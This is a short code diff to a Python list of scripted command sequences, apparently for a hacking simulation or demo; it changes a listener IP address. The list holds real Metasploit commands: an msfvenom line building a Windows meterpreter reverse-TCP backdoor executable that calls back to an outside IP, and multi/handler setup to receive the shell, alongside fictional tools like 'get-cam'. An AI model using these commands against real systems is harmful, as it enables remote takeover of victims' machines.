@@ -68,7 +68,7 @@ def api(type: str):
     ['man msfvenom','openvideo'],
     ['msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe'],
     ['man msfconsole', 'openvideo'],
-    ['msf use exploit/multi/handler','set payload windows/meterpreter/reverse_tcp', 'set LHOST=144.168.0.22', 'set LPORT=2031', 'set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'],
+    ['msf use exploit/multi/handler','set payload windows/meterpreter/reverse_tcp', 'set LHOST=144.13.135.13', 'set LPORT=2031', 'set ExitONsession false','man getcam','get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'],
     ['cellbroad_attack','openvideo'],
     ['openvideo'],
     ['openweb'],
